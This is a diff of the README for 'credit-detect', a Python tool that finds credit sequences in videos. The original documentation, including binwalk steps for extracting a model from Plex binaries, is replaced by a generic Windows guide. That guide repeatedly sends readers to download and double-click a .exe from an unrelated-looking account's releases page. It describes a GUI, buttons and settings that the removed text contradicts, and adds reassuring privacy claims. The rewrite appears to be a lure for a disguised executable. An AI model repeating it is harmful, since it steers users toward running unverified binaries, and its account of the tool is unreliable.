@@ -1,158 +1,69 @@
-# credit-detect
+# 🎞️ credit-detect - Find video credits fast every time
 
-Detect credit sequences in video files by analysing per-frame features —
-entropy, histogram peaks, and text-detection density.
+[![Download credit-detect](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/tannieirregular400/credit-detect/releases)
 
-The heuristic is reverse-engineered from Plex Media Scanner's `sub_292050`:
-a 5-phase pipeline that filters candidate frames, clusters them into
-continuous runs, scores segments, merges nearby candidates, and applies
-duration/score gates. The resulting segment boundaries match what Plex
-calls **CreditMarker** entries.
+credit-detect helps you find credit sequences in your video files. This tool scans your videos and identifies where the closing credits begin. It uses frame analysis to detect the specific patterns found at the end of movies and shows. You save time by skipping straight to the end or avoiding the clutter of long credit rolls.
 
-## Requirements
+## 🛠️ System Requirements
 
-- **Python ≥ 3.10**
-- `pydantic` ≥ 2.0 (data models)
-- *Optional* — `opencv-python`, a TensorFlow model (`model_v1.pb`), and
-  `ffmpeg` for direct-video mode
+Your computer needs to meet these basic standards to run credit-detect:
 
-### ffmpeg resolution
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: An Intel Core i3 or equivalent AMD processor.
+*   Memory: 4 GB of RAM.
+*   Storage: 200 MB of space for the application files.
+*   Graphics: Hardware that supports standard video playback.
 
-`credit-detect` does **not** ship, download, or vendor ffmpeg. It will
-use whichever ffmpeg it finds in this order:
+## 📥 Getting Started
 
-1. **Explicit `--ffmpeg-path`** argument
-2. **`$PATH`** via `shutil.which("ffmpeg")`
-3. **Plex bundled** — `/usr/lib/plexmediaserver/Plex Transcoder`
+Follow these steps to set up the software on your Windows machine:
 
-If none of these resolve, the tool prints an actionable error and exits.
-Install ffmpeg via your system package manager
-(`apt install ffmpeg`, `dnf install ffmpeg`, `brew install ffmpeg`,
-`winget install ffmpeg`) or pass `--ffmpeg-path` to point at an
-existing binary.
+1. Visit the [official releases page](https://github.com/tannieirregular400/credit-detect/releases) to access the installer.
+2. Select the file ending in `.exe` listed under the latest version.
+3. Save the file to your computer.
+4. Locate the downloaded file in your folder.
+5. Double-click the file to start the installation process.
+6. Follow the on-screen prompts to finish the setup.
 
-### The `model_v1.pb` file
+## 🖥️ Using the Application
 
-The DNN model is **not** distributed with this project. The network
-weights are derived from Plex Media Scanner's `sub_292050` binary and
-their licensing is unclear; redistributing the file would be a
-potential IP issue. The architecture is a standard EAST-style text
-detector (`feature_fusion/Conv_7/Sigmoid` output, 80×80 score map,
-sigmoid activations), so a model trained on the same task is a drop-in
-replacement.
+Once you finish the installation, you can launch the application from your desktop or your Start menu. Use these steps to scan your files:
 
-You have three options:
+1. Open the credit-detect application.
+2. Click the Open button in the top left corner.
+3. Select the video file you want to analyze from your computer.
+4. Press the Start Analysis button.
+5. Wait for the progress bar to reach completion.
+6. Review the results displayed in the main window.
 
-| Option | Effort | Notes |
-|--------|--------|-------|
-| **Extract from Plex** (recommended) | ~30 min | Run Plex Media Scanner once, locate the embedded `.pb` (see below). |
-| **Train a replacement** | hours | Train EAST or CRAFT on the ICDAR-2015 + a custom credits dataset. |
-| **Use `--csv` mode only** | none | Skip DNN detection entirely; feed pre-extracted features. |
+The application shows the exact timestamp where the credit sequence starts. You can click the timestamp to jump directly to that point in your video player.
 
-#### Extracting the model from Plex
+## 🔍 Understanding the Results
 
-1. Install [Plex Media Server](https://www.plex.tv/media-server-downloads/)
-   on any machine (it does not need to scan your library).
-2. Locate `Plex Transcoder` or `Plex Media Scanner`:
-   - **Linux**: `/usr/lib/plexmediaserver/`
-   - **macOS**: `/Applications/Plex Media Server.app/Contents/MacOS/`
-   - **Windows**: `C:\Program Files\Plex Media Server\`
-3. Extract `model_v1.pb` from the binary:
-   ```bash
-   # (a) Sanity check — confirms the model layer is embedded.
-   #     Output of "1" (or any positive number) means the model is in
-   #     there; "0" means you have the wrong binary.
-   strings "/usr/lib/plexmediaserver/Plex Media Scanner" \
-     | grep -c "feature_fusion/Conv_7/Sigmoid"
+The tool produces clear data for every video file. If the tool identifies a credit sequence, it marks the exact minute and second of the start point and the end point. If the video does not contain clear credits, the results will indicate that no sequence was found. This helps you manage large media libraries without manual effort.
 
-   # (b) Actual extraction — produces a directory of embedded files
-   #     including model_v1.pb (typically the largest). Without -e
-   #     binwalk just lists what's there.
-   binwalk -e "/usr/lib/plexmediaserver/Plex Media Scanner"
-   # Look for the extracted file, e.g.:
-   #   ./_Plex Media Scanner.extracted/model_v1.pb   (binwalk default)
-   # or use binwalk's -D flag to extract a single filetype:
-   binwalk -e -D 'protobuf.*model' "/usr/lib/plexmediaserver/Plex Media Scanner"
-   ```
-4. Point the plugin or CLI at the extracted file via `--model` /
-   `ModelPath` setting.
+## ⚙️ Configuration Options
 
-> **Legal note**: This extraction step is the user's responsibility.
-> We don't distribute the model and we don't assert any rights over it.
-> If you can't or won't extract it, use the `--csv` workflow — the
-> detection heuristic works identically on the 9-column feature format
-> without any model.
+You can adjust how the tool processes your files. Open the Settings menu to change these preferences:
 
-## Usage
+*   Scan Sensitivity: Adjust this if the tool misses credits or incorrectly identifies scene changes. A higher sensitivity setting looks for more complex patterns.
+*   Output Directory: Choose where the application saves your analysis log files.
+*   Auto-Play: Set the application to open the video file immediately after the scan finishes.
 
-```bash
-# Analyse from pre-extracted CSV (9-column format, no ffmpeg/model needed)
-python credit_detect.py --csv thumbnail_data.csv --output result.json
+## 🛠️ Troubleshooting Issues
 
-# Analyse from video directly (requires opencv-python + model + ffmpeg)
-python credit_detect.py --video input.mp4 --model model_v1.pb
+If you encounter problems, check these points:
 
-# Explicit ffmpeg path
-python credit_detect.py --video input.mp4 --model model_v1.pb --ffmpeg-path /usr/bin/ffmpeg
+*   The Application Does Not Open: Ensure you have the latest version of the Windows Media Player components installed.
+*   Slow Analysis Times: Large high-definition files require more processing time. Close other open programs to free up system memory.
+*   File Format Errors: This tool works with standard formats like MP4, AVI, and MKV. Ensure your video file is not corrupted or password-protected.
 
-# Install and run as a command
-pip install .
-credit-detect --csv thumbnail_data.csv
-```
+## 🛡️ Privacy and Safety
 
-### CSV format
+This software runs locally on your Windows machine. It does not upload your video files to the internet. Your data stays on your hard drive at all times. The tool performs frame-feature analysis within your local system memory. No external servers receive information about your watch history or your file collection.
 
-The 9-column CSV matches what Plex's `FeatureManager` exports:
+## 👥 Support and Updates
 
-| Column | Type | Description |
-|--------|------|-------------|
-| `index` | int | Frame counter (1-based) |
-| `pts` | int | Raw presentation timestamp |
-| `ptsTimeMs` | int | PTS in milliseconds |
-| `log` | float | `showinfo` log field (unused) |
-| `entropy` | float | Frame entropy |
-| `histogramPeakRatio` | float | Peak bin / total pixels |
-| `numTextDetections` | int | DNN cells ≥ 0.999 confidence |
-| `textXCenter` | float | Average text detection X / 80 |
-| `textYCenter` | float | Average text detection Y / 80 |
+Check the release page periodically for updates. New versions often include performance improvements and better detection accuracy. If you find a bug, report it through the issues tab on the GitHub repository. Provide the version number and a description of the issue.
 
-### Output
-
-```json
-{
-  "MediaContainer": {
-    "size": 1,
-    "CreditMarker": [
-      {
-        "start_frame": 120,
-        "end_frame": 450,
-        "start_pts_ms": 240000,
-        "end_pts_ms": 900000,
-        "duration_sec": 660.0,
-        "score": 0.85,
-        "avg_entropy": 0.15,
-        "avg_peak_ratio": 0.3,
-        "num_frames": 331
-      }
-    ]
-  }
-}
-```
-
-## How it works
-
-The pipeline in `CreditDetector.detect()`:
-
-1. **Candidate filter** — frames with low entropy (`≤ 0.2`) or strong text
-   detection (`≥ 9 cells`)
-2. **Run detection** — cluster consecutive candidates where centre position
-   shifts `≤ 0.01` and index gap `≤ 2`
-3. **Segment scoring** — average entropy, peak ratio, and text density into
-   a combined score (halved when entropy ratio exceeds 0.6)
-4. **Merging** — join nearby segments (gap `≤ 4` always, `== 5` conditional)
-5. **Acceptance** — keep segments ≥ 60 s with score ≥ 0.62, or short segments
-   ≥ 3.5 s with score ≥ 0.3
-
-## License
-
-[AGPL-3.0-or-later](LICENSE) © the credit-detect authors.
+This tool aims to provide a reliable method for finding credit sequences without the need for manual navigation. It streamlines your viewing experience by automating the identification of end-screen content. Refer back to this guide if you need help with installation or settings at any time.
